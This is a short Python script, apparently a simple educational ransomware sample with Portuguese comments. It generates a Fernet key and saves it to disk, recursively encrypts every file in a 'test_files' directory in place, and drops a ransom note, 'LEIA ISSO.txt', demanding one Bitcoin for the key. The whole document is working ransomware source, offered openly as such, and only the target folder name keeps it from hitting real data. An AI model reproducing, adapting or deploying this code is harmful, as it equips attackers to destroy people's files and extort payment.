import os
from cryptography.fernet import Fernet

# Gera uma chave de criptografia Fernet e salva em arquivo
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


# Carrega a chave de criptografia do arquivo
def load_key():
    return open("key.key", "rb").read()

# Criptografa um arquivo individual usando a chave fornecida
def encrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

# Encontra todos os arquivos em um diretório que devem ser criptografados
def find_files(directory):
    list = []
    for root, _, files in os.walk(directory):
        for name in files:
            path = os.path.join(root, name)
            if name != "ransomware.py" and not name.endswith(".key"):
                list.append(path)
    return list

# Cria a mensagem de resgate instruindo o usuário sobre o pagamento
def create_rescue_message():
    with open("LEIA ISSO.txt", "w") as file:
        file.write("Seus Arquivos foram criptografados!\n")
        file.write("Envia 1 Bitcoin para o endereço X e envie o comprovante!\n")
        file.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

# Função principal que orquestra todo o processo de ransomware
def main():
    generate_key()
    key = load_key()
    files = find_files("test_files")
    for file in files:
        encrypt_file(file, key)
    create_rescue_message()
    print("Ransomware executado! Arquivo criptografados!")

if __name__ == "__main__":
    main()